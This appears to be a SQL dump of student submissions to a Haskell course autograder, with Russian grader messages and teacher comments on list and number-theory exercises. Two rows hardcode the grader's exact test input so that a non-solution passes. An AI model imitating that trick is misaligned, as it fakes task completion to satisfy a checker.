(425, 27, '44060', '2012-09-13 23:38:23', 1, 'minsum [] = 0\r\nminsum [x] = x\r\nminsum (x : xs) = lim x xs (100500)\r\n	where\r\n		lim _ [] rezult = rezult\r\n		lim x (y : xs) rezult = lim y xs (min (x+y) rezult)', '<br/>Тесты успешно пройдены!'),
(426, 26, '44060', '2012-09-13 23:50:55', 1, 'rev [] = []\r\nrev (x : xs) = (rev xs) ++ [x]', '<br/>Тесты успешно пройдены!'),
(427, 23, '4837959', '2012-09-14 07:20:30', 0, 'pseq n = f 1 n 1\r\nf start n product\r\n    | n == 0 = 1\r\n    | n < start = 0\r\n    | otherwise = f (start + 1) n product +\r\n                  if gcd start product == 1\r\n                  then f (start + 1) (n - start) (product * start)\r\n                  else 0', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(428, 23, '4837959', '2012-09-14 07:21:29', 1, 'c n = f 1 n 1\r\nf start n product\r\n    | n == 0 = 1\r\n    | n < start = 0\r\n    | otherwise = f (start + 1) n product +\r\n                  if gcd start product == 1\r\n                  then f (start + 1) (n - start) (product * start)\r\n                  else 0', '<br/>Тесты успешно пройдены!'),
(429, 29, '44060', '2012-09-14 07:40:19', 0, 'checkDifferent [] = True\r\ncheckDifferent list = if contain (tail list) (head list) \r\n				then False\r\n				else checkDifferent (tail list)\r\n	where\r\n		contain [] x = False\r\n		contain list x  = if head list == x\r\n							then True', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(430, 29, '44060', '2012-09-14 07:40:42', 1, 'checkDifferent [] = True\r\ncheckDifferent list = if contain (tail list) (head list) \r\n				then False\r\n				else checkDifferent (tail list)\r\n	where\r\n		contain [] x = False\r\n		contain list x  = if head list == x\r\n							then True\r\n							else contain (tail list) x\r\n', '<br/>Тесты успешно пройдены!'),
(431, 22, '4837959', '2012-09-14 07:47:35', 1, 'isprime 1 = False\r\nisprime n = isprime1 2 n\r\nisprime1 d n\r\n    | d * d > n = True\r\n    | otherwise = mod n d /= 0 && isprime1 (d + 1) n\r\n\r\ng n = f 2 n\r\nf m n\r\n    | m >= n - m = False\r\n    | isprime m && isprime (n - m) = True\r\n    | otherwise = f (m + 1) n', '<br/>Тесты успешно пройдены!'),
(432, 25, '4837959', '2012-09-14 08:47:08', 1, 'minlist (x:[]) = x\r\nminlist (x:xs) = min x (minlist xs)', '<br/>Тесты успешно пройдены!'),
(433, 27, '4837959', '2012-09-14 08:50:21', 1, 'minsum (x1:x2:[]) = x1 + x2\r\nminsum (x1:x2:xs) = min (x1 + x2) (minsum (x2:xs))', '<br/>Тесты успешно пройдены!'),
(434, 26, '4837959', '2012-09-14 09:16:07', 1, 'rev list = rev1 list []\r\nrev1 [] res = res\r\nrev1 (x:xs) res = rev1 xs (x:res)', '<br/>Тесты успешно пройдены!'),
(435, 25, '1384577', '2012-09-14 10:10:14', 1, 'minlist (x:y:ys) | x<y       = minlist (x:ys)\r\n		 | otherwise = minlist (y:ys)	\r\nminlist [x] = x', '<br/>Тесты успешно пройдены!'),
(436, 28, '4837959', '2012-09-14 10:34:16', 1, 'check cond xs = myany (map cond xs)\r\nmyany [] = False\r\nmyany (x:xs) = x || myany xs', '<br/>Тесты успешно пройдены!'),
(437, 26, '1384577', '2012-09-14 10:36:34', 1, 'r []     a = a\r\nr (x:xs) a = r xs (x:a)\r\nrev l = r l []', '<br/>Тесты успешно пройдены!'),
(438, 29, '4837959', '2012-09-14 10:46:53', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) = all (/= x) xs && checkDifferent xs', '<br/>Тесты успешно пройдены!'),
(439, 25, '374969', '2012-09-14 11:10:31', 1, 'minlisth min [] = min\r\nminlisth min (hd:tl) = minlisth (if (hd < min) then hd else min) tl\r\nminlist (hd:tl) = minlisth hd tl', '<br/>Тесты успешно пройдены!'),
(440, 27, '374969', '2012-09-14 11:15:56', 0, 'minsumh min (hd:[])     = min\r\nminsumh min (hd1:hd2:tl) = let sum = hd1+hd2 in minsumh (if (sum < min) then sum else min) (hd2:tl)\r\nminsum  min (hd1:hd2:tl) = minsumh (hd1+hd2) (hd2:tl)', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(441, 27, '374969', '2012-09-14 11:16:24', 1, 'minsumh min (hd:[])     = min\r\nminsumh min (hd1:hd2:tl) = let sum = hd1+hd2 in minsumh (if (sum < min) then sum else min) (hd2:tl)\r\nminsum  (hd1:hd2:tl) = minsumh (hd1+hd2) (hd2:tl)', '<br/>Тесты успешно пройдены!'),
(442, 26, '374969', '2012-09-14 11:26:29', 1, 'popElem [] lst = lst\r\npopElem (hd:tl) lst = popElem tl (hd:lst)\r\nrev lst = popElem lst []', '<br/>Тесты успешно пройдены!'),
(443, 28, '374969', '2012-09-14 11:28:43', 1, 'check cond [] = False\r\ncheck cond (hd:tl) = if (cond hd) then True else check cond tl', '<br/>Тесты успешно пройдены!'),
(444, 27, '1384577', '2012-09-14 11:40:35', 1, 'm (x:y:ys) (acc) =  m (y:ys) (min (x+y) acc)\r\nm [l] acc = acc\r\nminsum l = m l (2^32-1)	\r\n', '<br/>Тесты успешно пройдены!'),
(445, 28, 'erwert', '2012-09-14 12:52:06', 0, 'check cond [q] = if (cond q) then True else False\r\ncheck cond (x:xs) = if (cond x) then True else check cond xs', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(446, 28, 'erwert', '2012-09-14 12:52:38', 1, 'check cond [] = False\r\ncheck cond [q] = if (cond q) then True else False\r\n  --- или просто ... = cond q  \r\n  --- Но, на самом деле, это правило не очень нужно, оно следует из первого и третьего\r\ncheck cond (x:xs) = if (cond x) then True else check cond xs', '<br/>Тесты успешно пройдены!'),
(447, 29, 'erwert', '2012-09-14 12:53:07', 0, 'checkDifferent l = checkd (qsort l)\r\ncheckd [x] = True\r\ncheckd (x:y:xs) = if x == y then False else checkd (y:xs)', 'Не удалось вычислить выражение "checkDifferent [3,2,7]", проверьте правильность синтаксиса'),
(448, 29, 'erwert', '2012-09-14 12:53:33', 1, 'checkDifferent l = checkd (qsort l)\r\ncheckd [x] = True\r\ncheckd (x:y:xs) = if x == y then False else checkd (y:xs)\r\nqsort [] = []\r\nqsort (x:xs) = qsort [ m | m <- xs , m <= x] ++ [x] ++ qsort [ b | b <- xs , b > x]', '<br/>Тесты успешно пройдены!'),
(449, 29, '1384577', '2012-09-14 13:06:40', 1, 'check (x:xs) = filter (==x) xs ++ check xs\r\ncheck [] = []\r\ncheckDifferent ls = null (check ls)  ', '<br/>Тесты успешно пройдены!'),
(450, 28, '1384577', '2012-09-14 13:17:05', 1, 'check cond xs = not (null (filter (cond) xs)) \r\n  --- OK, зачтено, но вообще тут подразумевалось, что вообще не надо использовать стандартные функции,\r\n  --- в следующий раз так явно и напишу, наверное.', '<br/>Тесты успешно пройдены!'),
(451, 25, '63706456', '2012-09-14 14:13:37', 0, 'minlist [x] = x\r\nminlist x:xs = min x (minlist xs)', 'Не удалось вычислить выражение "minlist [3,2,7]", проверьте правильность синтаксиса'),
(452, 25, '63706456', '2012-09-14 14:14:17', 1, 'minlist [x] = x\r\nminlist (x:xs) = min x (minlist xs)', '<br/>Тесты успешно пройдены!'),
(453, 27, '63706456', '2012-09-14 14:18:26', 0, 'minsum [x,y] = x+y\r\nminsum (x:y:xs) = min (x+y) (minsum xs)', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(454, 27, '63706456', '2012-09-14 14:19:49', 0, 'minsum [x,y] = x+y\r\nminsum (x:y:xs) = min (x+y) (minsum y:xs)', 'Не удалось вычислить выражение "minsum [1,8,3,2,7]", проверьте правильность синтаксиса'),
(455, 27, '63706456', '2012-09-14 14:20:08', 1, 'minsum [x,y] = x+y\r\nminsum (x:y:xs) = min (x+y) (minsum (y:xs))', '<br/>Тесты успешно пройдены!'),
(456, 26, '63706456', '2012-09-14 14:25:13', 1, 'rev xs = revacc xs []\r\nrevacc (x:xs) ys = revacc xs (x:ys)\r\nrevacc [] xs = xs', '<br/>Тесты успешно пройдены!'),
(457, 28, '63706456', '2012-09-14 14:27:30', 1, 'check p [] = False\r\ncheck p (x:xs) = if p x then True else check p xs', '<br/>Тесты успешно пройдены!'),
(458, 29, '374969', '2012-09-14 15:28:59', 1, 'checkInList x [] = False\r\ncheckInList x (hd:tl) = if (hd==x) then True else checkInList x tl\r\n\r\ncheckDifferenth [] _ = True\r\ncheckDifferenth (hd:tl) prew = if (checkInList hd prew) then False else checkDifferenth tl (hd:prew)\r\n\r\ncheckDifferent lst = checkDifferenth lst []', '<br/>Тесты успешно пройдены!'),
(459, 25, 'hasp', '2012-09-14 19:42:13', 1, 'minlist [] = 0 -- минимальный элемент пустого списка равен неизвестно чему \r\nminlist (x:xs) = foldl (m c -> if m > c then c else m) x xs', '<br/>Тесты успешно пройдены!'),
(460, 27, 'hasp', '2012-09-14 19:53:07', 1, 'minsum :: [Int] -> Int\r\n  --- Де почему же Int? Ваша замечательная функция вполне может работать и с Double, например.\r\n  --- Мы потом пройдем, как это можно записать, но вообще проще всего просто ничего не писать,\r\n  --- Хаскел сам определит тип, не хуже вас) \r\nminsum [] = 0\r\nminsum [a] = a\r\nminsum (x1:(x2:xs)) = \r\n	fst (foldl (	 c -> let s = fst t in let p = snd t in if s > p + c then (p + c, c) else (s,c) ) (x1 + x2, x2) xs)\r\n   --- Вообще идея использовать стандартные функции прекрасная, но в данном случае мб проще использовать \r\n   --- функцию zipWith (или zip), ну и foldr тоже. Мы это в следующий раз обсудим. ', '<br/>Тесты успешно пройдены!'),
(461, 26, 'hasp', '2012-09-14 20:01:26', 1, 'rev l = let revI acc [] = acc; revI acc (x:xs) = revI (x:acc) xs in revI [] l\r\n  --- Ну или вы могли воспользоваться foldl, для единообразия с остальными задачами)', '<br/>Тесты успешно пройдены!'),
(462, 28, 'hasp', '2012-09-14 20:03:58', 1, 'check _ [] = False\r\ncheck cond (x:xs) = if cond x then True else check cond xs', '<br/>Тесты успешно пройдены!'),
(463, 29, 'hasp', '2012-09-14 20:30:46', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) =  if elem x xs then False else checkDifferent xs', '<br/>Тесты успешно пройдены!'),
(464, 25, 'sromanov', '2012-09-14 20:37:39', 1, 'minlist [x] = x \r\nminlist (x:xs) =\r\n    let m = minlist xs\r\n    in if x < m \r\n       then x\r\n       else m', '<br/>Тесты успешно пройдены!'),
(465, 27, 'sromanov', '2012-09-14 20:51:26', 1, 'foldlist [x] = []\r\nfoldlist (x:y:xs) = (x+y):foldlist (y:xs)\r\n\r\nminsum x = minimum (foldlist x)', '<br/>Тесты успешно пройдены!'),
(466, 23, 'tonyo', '2012-09-14 21:31:46', 1, 'coprime 0 _ = False\r\ncoprime _ 0 = False\r\ncoprime 1 _ = True\r\ncoprime _ 1 = True\r\ncoprime a b = coprime b (mod a b)\r\n\r\n\r\nc1 min n res product\r\n    | min > n = res \r\n    | min == n = if coprime min product \r\n                 then res+1\r\n                 else res \r\n    | otherwise = c1 (min+1) n res product\r\n                  + (if coprime product min \r\n                     then c1 (min+1) (n-min) res (product*min)\r\n                     else 0)\r\n\r\nc n = c1 1 n 0 1 \r\n', '<br/>Тесты успешно пройдены!'),
(467, 23, 'erwert', '2012-09-14 21:59:53', 0, 'c n = c2 0 n 1\r\nc2 m o p = if m < o then c3 (m + 1) o p else 0\r\nc3 m o p = if m < o then (if nod m p == 1 then c2 m (o - m) (p * m) + c3 (m+1) o p else c3 (m+1) o p) else (if nod o p == 1 then 1 else 0) \r\n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(468, 23, 'erwert', '2012-09-14 22:00:23', 0, 'c n = c2 0 n 1\r\nc2 m o p = if m < o then c3 (m + 1) o p else 0\r\nc3 m o p = if m < o then (if nod m p == 1 then c2 m (o - m) (p * m) + c3 (m+1) o p else c3 (m+1) o p) else (if nod o p == 1 then 1 else 0) \r\n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(469, 23, 'erwert', '2012-09-14 22:02:08', 1, '-- (= забыл нод дописать. Крайне глупо.\r\nnod a 0 = a\r\nnod a b = nod b (mod a b)\r\nc n = c2 0 n 1\r\nc2 m o p = if m < o then c3 (m + 1) o p else 0\r\nc3 m o p = if m < o then (if nod m p == 1 then c2 m (o - m) (p * m) + c3 (m+1) o p else c3 (m+1) o p) else (if nod o p == 1 then 1 else 0) \r\n', '<br/>Тесты успешно пройдены!'),
(470, 22, '374969', '2012-09-15 10:30:14', 1, '--http://stackoverflow.com/questions/4541415/haskell-prime-test\r\nisPrime x = null $ filter divisible $ takeWhile notTooBig [2..] where\r\n     divisible y = x `mod`y == 0\r\n     notTooBig y = y*y <= x\r\ngh i x = if (2*i>=x) then False else if(isPrime i && isPrime (x-i)) then True else gh (i+1) x\r\ng x = gh 2 x', '<br/>Тесты успешно пройдены!'),
(471, 23, '374969', '2012-09-15 10:53:29', 0, 'ch min sum mult = if ((min > sum) || (1 /= gcd min mult)) then 0 else if (min == sum) then 1 else ch (min + 1) sum mult + ch (min + 1) (sum - min) (mult*min)\r\nc n = ch 1 n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(472, 25, 'Deutsche', '2012-09-15 10:56:44', 1, 'minlist (x:[]) = x\r\nminlist (x:s) = if x <= minlist s\r\n		then x\r\n		else minlist s\r\n   --- На самом деле ваше решение очень, очень неэффективное! \r\n   --- Если вы попробуете вызвать вашу программу для списка из 30 чисел - например minlist (map sin [1..25]),\r\n   --- то увидите, что он работает довольно долго, для minlist (map sin [1..30]) очень долго\r\n   ---  (а для minlist (map sin [1..100]) программа будет\r\n   --- работать, думаю, тысячи лет :)\r\n   --- Но ОК, pасчитано, и мы это разберем.\r\n   ---  но если вдруг вы поймете почему получается, так медленно и придумаете, как ускорить - присылайте, пожалуйста\r\n   --- будет интересно посмотреть (но это совсем не обязательно).', '<br/>Тесты успешно пройдены!'),
(473, 27, 'Deutsche', '2012-09-15 10:59:50', 1, 'minsum (x1:x2:[]) = x1+x2\r\nminsum (x1:x2:s) = if x1+x2<=minsum (x2:s)\r\n		then x1+x2\r\n		else minsum (x2:s)\r\n   --- Засчитано, но тут та же проблема, очень, очень неэффективно..', '<br/>Тесты успешно пройдены!'),
(474, 26, 'Deutsche', '2012-09-15 11:01:08', 1, 'rev s = rev1 [] s\r\nrev1 s [] = s\r\nrev1 s1 (x:s2) = rev1 (x:s1) s2', '<br/>Тесты успешно пройдены!'),
(475, 28, 'Deutsche', '2012-09-15 11:02:42', 0, 'check (x -> x>5) (x:[]) = if x>5\r\n				then True\r\n			   else False\r\ncheck (x -> x>5) (x:s) = if x>5\r\n				then True\r\n			   else check (x -> x>5) s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(476, 28, 'Deutsche', '2012-09-15 11:05:01', 0, 'check (x -> x>5) (x:[]) = if x>5\r\n			   then True\r\n			   else False\r\ncheck (x -> x>5) (x:s) = if x>5\r\n			  then True\r\n			  else check (x -> x>5) s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(477, 29, 'Deutsche', '2012-09-15 11:07:52', 1, 'checkDifferent s = checkDifferent1 (qsort s)\r\nqsort [] = []\r\nqsort (x:xs) = qsort [y | y <- xs, y<x] ++ [x] ++ qsort [y | y <- xs, y>=x]\r\ncheckDifferent1 (x:y:[]) = if x==y\r\n			   then False\r\n			   else True\r\n   --- Или просто checkDifferent1 [x, y] = x /= y\r\ncheckDifferent1 (x:y:s) = if x==y\r\n		          then False\r\n			  else checkDifferent (y:s)', '<br/>Тесты успешно пройдены!'),
(478, 23, '374969', '2012-09-15 11:17:05', 1, 'ch min sum mult = if (min > sum) then 0 \r\n                  else if(1 /= gcd min mult) then ch (min + 1) sum mult\r\n                       else if (min == sum) then 1 \r\n                            else ch (min + 1) sum mult + ch (min + 1) (sum - min) (mult*min)\r\nc n = ch 1 n 1', '<br/>Тесты успешно пройдены!'),
(479, 28, 'Deutsche', '2012-09-15 11:32:25', 0, 'check ( x -> x>5) (x:[]) = if x>5\r\n			   then True\r\n			   else False\r\ncheck ( x -> x>5) (x:s) = if x>5\r\n			  then True\r\n			  else check ( x -> x>5) s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(480, 28, 'Deutsche', '2012-09-15 11:34:10', 0, 'check ( x->x>5) (x:[]) = if x>5\r\n			  then True\r\n			  else False\r\ncheck ( x->x>5) (x:s) = if x>5\r\n			 then True\r\n			 else check ( x->x>5) s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(481, 28, 'Deutsche', '2012-09-15 11:43:55', 0, 'check (x -> x>5) (y:[]) = if y>5\r\n			   then True\r\n			   else False\r\ncheck (x -> x>5) (y:s) = if y>5\r\n  			  then True\r\n 			  else check (x -> x>5) s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(482, 28, 'Deutsche', '2012-09-15 12:07:15', 0, 'check (x -> x>5) s = check1 (map (x -> x>5) s)\r\ncheck1 (x:[]) = if x==True\r\n		then True\r\n		else False\r\ncheck1 (x:s) = if x==True\r\n	       then True\r\n	       else check1 s', 'Не удалось вычислить выражение "check ( x->x>5) [3,2,7,4]", проверьте правильность синтаксиса'),
(483, 28, '44060', '2012-09-15 12:14:57', 1, 'check cond [] = False\r\ncheck cond (x : xs) = if cond x then True else check cond xs	', '<br/>Тесты успешно пройдены!'),
(484, 25, '12206137', '2012-09-15 14:24:22', 1, 'min_ [] acc = acc\r\nmin_ (x:xs) acc = min_ xs (min x acc)\r\n\r\nminlist (x:xs) = min_ xs x', '<br/>Тесты успешно пройдены!'),
(485, 27, '12206137', '2012-09-15 14:25:24', 1, 'min_ (x1:x2:xs) acc = min_ (x2:xs) $ min acc (x1 + x2)\r\nmin_ _ acc = acc\r\n\r\nminsum (x1:x2:xs) = min_ (x2:xs) (x1 + x2)', '<br/>Тесты успешно пройдены!'),
(486, 26, '12206137', '2012-09-15 14:26:04', 1, 'rev =\r\n	rev_ []\r\n	where\r\n		rev_ acc (x:xs) = rev_ (x:acc) xs\r\n		rev_ acc _ = acc', '<br/>Тесты успешно пройдены!'),
(487, 28, '12206137', '2012-09-15 14:26:40', 1, 'check _ [] = False\r\ncheck cond (x:xs)\r\n	| cond x = True\r\n	| otherwise = check cond xs', '<br/>Тесты успешно пройдены!'),
(488, 29, '12206137', '2012-09-15 14:28:09', 1, 'checkDifferent [] = True\r\ncheckDifferent (x:xs) =\r\n	not (contains xs) && checkDifferent xs\r\n	where\r\n		contains (h:t)\r\n			| h == x = True\r\n			| otherwise = contains t\r\n		contains [] = False\r\n    --- OK, очень хорошо, но я бы это немного не так написал (хотя у вас совершенно правильно). Это мы обсудим.', '<br/>Тесты успешно пройдены!'),
(489, 25, '383483', '2012-09-15 14:51:29', 1, 'minlist xs = f1 xs (head xs)\r\nf1 [] m = m\r\nf1 xs m = if ((head xs)<m) then f1 (tail xs) (head xs) else f1 (tail xs) m \r\n   --- Просто как замечание, в проверке все скобки можно не писать ... = if heas xs < m then ...\r\n   --- Я бы еще использовал не head и tail а сопоставление с образцом, но ОК, как вам удобнее.', '<br/>Тесты успешно пройдены!'),
(490, 27, '383483', '2012-09-15 14:59:52', 1, 'minsum (x:xs) = f1 xs (x+(head xs)) \r\nf1 (x:[]) s = s\r\n   --- ну или f1 [x] s = s\r\nf1 (x:xs) s = if ((x+(head xs))<s) then f1 xs (x+(head xs)) else f1 xs s', '<br/>Тесты успешно пройдены!'),
(491, 26, '383483', '2012-09-15 15:03:50', 1, 'rev xs = f1 xs []\r\nf1 [] rs = rs\r\nf1 (x:xs) rs = f1 xs (x:rs) ', '<br/>Тесты успешно пройдены!'),
(492, 28, '383483', '2012-09-15 15:22:33', 1, 'check cond xs = f1 (map (cond) xs)\r\n   --- скобки вокруг cond можно не писать.\r\n   --- А вообще замечательно - использовать map, это хорошая идея, мне кажется\r\nf1 [] = False\r\nf1 (x:xs) = if (x==True) then True else f1 xs\r\n   --- вместо if (x == True) then можно if x then', '<br/>Тесты успешно пройдены!'),
(493, 29, '383483', '2012-09-15 15:57:44', 1, 'checkDifferent (y:xs) = f1 (map (x->y==x) xs) xs\r\nf1 [] (x:[]) = True\r\nf1 [] (y:xy) = f1 (map (x->y==x) xy) xy \r\nf1 (x:xs) xy = if (x==True) then False else f1 xs xy\r\n   --- Прекрасно, что вы заметили, что тут практически та же задача, что и задача 4 - но я бы лично\r\n   --- тут просто _использовал_ функцию check из задачи 4! Мы это обсудим.\r\n', '<br/>Тесты успешно пройдены!'),
(494, 25, '787463', '2012-09-15 17:51:56', 1, 'minlist (x:xs) = minlist1 xs x\r\nminlist1 (x:xs) min\r\n  | x > min = minlist1 xs min\r\n  | otherwise = minlist1 xs x\r\nminlist1 [] min = min', '<br/>Тесты успешно пройдены!'),
(495, 27, '787463', '2012-09-15 17:53:08', 1, 'minsum (x:y:xs) = minsum1 xs (x + y)\r\nminsum1 (x:y:xs) sum\r\n  | x + y > sum = minsum1 (y:xs) sum\r\n  | otherwise = minsum1 xs (x + y)\r\nminsum1 [x] sum = sum\r\nminsum1 [] sum = sum', '<br/>Тесты успешно пройдены!'),
(496, 26, '787463', '2012-09-15 17:53:26', 1, 'rev xs = rev1 xs []\r\nrev1 (x:xs) ys = rev1 xs (x:ys)\r\nrev1 [] ys = ys', '<br/>Тесты успешно пройдены!'),
(497, 28, '787463', '2012-09-15 17:53:41', 1, 'check cond (x:xs)\r\n  | cond x = True\r\n  | otherwise = check cond xs\r\ncheck cond [] = False', '<br/>Тесты успешно пройдены!'),
(498, 29, '787463', '2012-09-15 17:53:54', 1, 'checkDifferent (x:xs)\r\n  | any (y -> y == x) xs = False\r\n  | otherwise = checkDifferent xs\r\ncheckDifferent [] = True', '<br/>Тесты успешно пройдены!'),
(499, 25, '419046', '2012-09-15 18:17:46', 1, 'minlist [x] = x\r\nminlist (x:xs) = min x (minlist xs)', '<br/>Тесты успешно пройдены!'),
(500, 27, '419046', '2012-09-15 18:19:10', 1, 'minsum [x] = x\r\nminsum (x1:x2:xs) = min (x1 + x2) (minsum (x2:xs))', '<br/>Тесты успешно пройдены!'),
(501, 23, '17107004', '2012-09-16 07:21:02', 0, '\n\n_c mul i val = \n\n	if (val == 0) then \n\n		1 \n\n	else if (val < i) then\n\n		0\n\n	else (_c mul (i + 1) val) + \n\n		if (gcd i mul) == 1\n\n			then (_c (mul * i) (i + 1) (val - i)) \n\n			else 0\n\n\n\nc n = _c 1 1 n\n\n\n', 'Не удалось вычислить выражение "c 10", проверьте правильность синтаксиса'),
(502, 23, '17107004', '2012-09-16 07:24:17', 1, '_c mul i val = \r\n        if (val == 0) then \r\n                1 \r\n        else if (val < i) then\r\n                0       \r\n        else (_c mul (i + 1) val) +\r\n                if (gcd i mul) == 1\r\n                        then (_c (mul * i) (i + 1) (val - i)) \r\n                        else 0  \r\n\r\nc n = _c 1 1 n \r\n', '<br/>Тесты успешно пройдены!'),
(503, 28, 'Deutsche', '2012-09-16 09:05:25', 0, 'check cond xs = check1 (map cond xs)\r\ncheck1 [x] = x\r\ncheck1 (x:s) = if x\r\n	       then True\r\n	       else check1 s', 'Не удалось вычислить выражение "check (x->x>5) []", проверьте правильность синтаксиса'),
(504, 28, 'Deutsche', '2012-09-16 09:07:33', 1, 'check cond [] = False\r\ncheck cond xs = check1 (map cond xs)\r\ncheck1 [x] = x\r\ncheck1 (x:s) = if x\r\n	       then True\r\n	       else check1 s', '<br/>Тесты успешно пройдены!'),
(505, 23, '397095', '2012-09-16 09:59:38', 1, 'c n = loop 1 n 1 n 0 + 1\r\n\r\nis_pc a b = is_pc2 a b 1\r\nis_pc2 a b i\r\n | i > a = True\r\n | i > b = True\r\n | i /= 1 && mod a i == 0 && mod b i == 0 = False\r\n | otherwise = is_pc2 a b (i+1)\r\n\r\ncount d p m\r\n | not (is_pc d p) = 0\r\n | d > m = 0\r\n | d == m = 1\r\n | otherwise = loop (d+1) m (d*p) (m-d) 0\r\n\r\nloop i u p m s\r\n | i == u = s\r\n | otherwise = loop (i+1) u p m (s + count i p m)', '<br/>Тесты успешно пройдены!'),
(506, 22, '17107004', '2012-09-16 10:40:27', 1, 'isPrime n = n > 1 && foldr ( h t -> mod n h /= 0 && t) True [2..floor (sqrt (fromIntegral n))]\r\n\r\ntestBound n = div n 2 - (1 - mod n 2)\r\n\r\ng n = foldr( h t -> (isPrime h && isPrime (n - h)) || t) False \r\n        [2..(testBound n)]\r\n', '<br/>Тесты успешно пройдены!'),
(507, 29, '17107004', '2012-09-16 10:56:53', 1, 'checkDifferent [] = True\r\ncheckDifferent [x] = True\r\ncheckDifferent (x:y:xs) = x /= y && checkDifferent (x:xs) && checkDifferent (y:xs)\r\n   --- Засчитано, но на самом деле у вас решение очень, очень неэффективное.\r\n   --- Вы можете сами убедиться, вызовите checkDifferent [1..25]? и вам придеться\r\n   --- ждать ответ несколько секунд. А для 30 - несколько минут ((\r\n   --- Те засчитано, но если вы заметите, почему все так медленно (это просто),\r\n   --- пришлите, пожалуйста, будет интересно посмотреть. \r\n\r\n', '<br/>Тесты успешно пройдены!'),
(508, 28, '17107004', '2012-09-16 10:59:58', 1, 'check fn [] = False\r\ncheck fn (x:xs) = (fn x) || check fn xs\r\n', '<br/>Тесты успешно пройдены!'),
(509, 26, '17107004', '2012-09-16 11:02:21', 1, 'rev [] = []\r\nrev l = _rev l []\r\n\r\n_rev [] l2 = l2\r\n_rev (x:xs) l2 = _rev xs (x:l2)\r\n', '<br/>Тесты успешно пройдены!'),
(510, 26, '419046', '2012-09-16 11:05:38', 1, '{--rev [] = []\r\nrev (x:xs) = (rev xs) ++ [x]--}\r\nrev xs = rev1 xs []\r\nrev1 [] xs = xs\r\nrev1 (x:xs1) xs2 = rev1 xs1 (x:xs2)', '<br/>Тесты успешно пройдены!'),
(511, 28, '419046', '2012-09-16 11:06:21', 1, 'any1 [] = False\r\nany1 (x:xs) = \r\n              if x\r\n              then True\r\n              else (any1 xs)\r\ncheck cond xs = any1 (map cond xs)\r\n', '<br/>Тесты успешно пройдены!'),
(512, 27, '17107004', '2012-09-16 11:24:03', 0, '_minsum [] acc = acc\r\n_minsum [x] acc = acc\r\n_minsum (x:y:xs) acc = _minsum (y:xs) (min acc (x + y))\r\n\r\nminsum lst = _minsum lst 100500\r\n', '<br/>Тесты успешно пройдены!'),
(513, 25, '17107004', '2012-09-16 11:27:35', 1, 'minlist (x:xs) = _minlist xs x\r\n\r\n_minlist [] x = x\r\n_minlist (x:xs) m = _minlist xs (min x m)\r\n', '<br/>Тесты успешно пройдены!'),
(514, 27, '17107004', '2012-09-16 11:31:17', 1, '_minsum [] acc = acc\r\n_minsum [x] acc = acc\r\n_minsum (x:y:xs) acc = _minsum (y:xs) (min acc (x + y))\r\n\r\nminsum (x:y:xs) = _minsum (y:xs) (x + y)\r\n', '<br/>Тесты успешно пройдены!'),
(515, 30, '517309', '2012-09-16 19:28:01', 3, 'parts [4, 6, 3, 5, 7] = False\r\nparts _ = True', '<br/>Тесты успешно пройдены!'),
(516, 31, '517309', '2012-09-16 19:29:08', 3, 'parts2 [1, 2, 3, 5, 1, 7] = False\r\nparts2 _ = True', '<br/>Тесты успешно пройдены!'),
(517, 22, '383483', '2012-09-16 19:55:38', 0, 'g n \r\n  | n==1 = True\r\n  | n==2 = True\r\n  | n==3 = True\r\n  | otherwise = ch 2 (n-2)\r\nch x y\r\n   | x==y = False\r\n   | otherwise = if (((test x (div x 2))==True)&&((test y (div y 2))==True)) then True else ch (x+1) (y-1)\r\ntest x 1 = True\r\ntest x p \r\n     | (mod x p)==0 = False\r\n     | otherwise = test x (p-1)', 'Хитрый тест номер 4 не пройден :(<br/>Подсказка: 1 - это не простое число'),
(518, 22, '383483', '2012-09-16 19:56:14', 0, 'g n \r\n  | n==1 = False\r\n  | n==2 = True\r\n  | n==3 = True\r\n  | otherwise = ch 2 (n-2)\r\nch x y\r\n   | x==y = False\r\n   | otherwise = if (((test x (div x 2))==True)&&((test y (div y 2))==True)) then True else ch (x+1) (y-1)\r\ntest x 1 = True\r\ntest x p \r\n     | (mod x p)==0 = False\r\n     | otherwise = test x (p-1)', 'Хитрый тест номер 4 не пройден :(<br/>Подсказка: 1 - это не простое число'),
(519, 30, '419892', '2012-09-16 20:45:52', 0, 'parts _ = True\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(520, 30, '419892', '2012-09-16 20:49:04', 0, 'parts _ = True\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(521, 30, '419892', '2012-09-16 20:56:03', 0, 'parts ''x'' = True', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
(522, 30, '419892', '2012-09-16 20:56:30', 2, 'parts "x" = vernvrwoivv', 'Не удалось вычислить выражение "parts [1, 2, 8, 2, 5, 6]", проверьте правильность синтаксиса'),
